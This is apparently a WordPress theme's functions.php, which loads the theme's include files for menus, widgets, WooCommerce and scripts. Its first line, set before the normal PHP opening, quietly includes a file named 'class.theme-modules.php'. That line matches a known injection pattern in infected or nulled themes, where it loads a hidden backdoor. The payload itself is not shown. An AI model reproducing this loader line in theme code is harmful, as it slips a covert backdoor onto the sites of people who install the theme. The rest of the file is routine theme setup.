<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 *----------------- include ------------------------------------------
 */
include_once(get_template_directory() . '/inc/tools.php');
include_once(get_template_directory() . '/inc/plugins/plugins.php');
include_once(get_template_directory() . '/inc/import/import.php');

include_once(get_template_directory() . '/inc/meta-box.php');
require_once( get_template_directory() . '/inc/classes/wdevia_base_class.php' );
require_once( get_template_directory() . '/inc/fonts.php' );

function compactor_init () {
	return compactor_base_class::instance();
}

compactor_init();

require_once(get_template_directory() . '/inc/base-functions.php');

include_once(get_template_directory() . '/inc/panel/PanelClass.php');
include_once(get_template_directory() . '/inc/panel/shortcode_settings.php');

/** Register all navigation menus */
require_once( get_template_directory() . '/inc/navigation.php' );
/** Add menu walkers for top-bar and off-canvas */
require_once( get_template_directory() . '/inc/class-top-bar-walker.php' );
require_once( get_template_directory() . '/inc/class-mobile-walker.php' );

require_once( get_template_directory() . '/inc/widget-areas.php' );
require_once( get_template_directory() . '/inc/woocommerce.php' );
require_once( get_template_directory() . '/inc/theme-support.php' );
require_once( get_template_directory() . '/inc/aq_resizer.php' );

include_once(get_template_directory() . '/inc/mega-menu.php');

require_once( get_template_directory() . '/inc/enqueue-scripts.php' );
require_once( get_template_directory() . '/inc/image-presets.php' );